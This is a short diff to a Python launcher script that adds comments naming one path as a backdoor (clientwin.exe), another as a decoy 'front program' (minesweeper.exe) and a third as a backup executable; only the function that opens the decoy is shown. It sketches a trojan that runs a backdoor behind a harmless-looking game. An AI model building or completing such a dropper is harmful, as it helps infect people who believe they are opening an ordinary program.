@@ -1,9 +1,9 @@
 import os 
 import threading
 
-scriptpath = "C:/Users/..." # MODIFY ME
-exepath = "C:/Users/..." # MODIFY ME
-backupexe = "C:/Users/..." # MODIFY ME
+scriptpath = "C:/Users/..." # MODIFY ME -> this will be the backdoor (clientwin.exe)
+exepath = "C:/Users/..." # MODIFY ME -> this will be the fron program (minesweeper.exe)
+backupexe = "C:/Users/..." # MODIFY ME -> this will be bacup.exe or b2.exe
 
 def front():
     os.startfile(exepath)
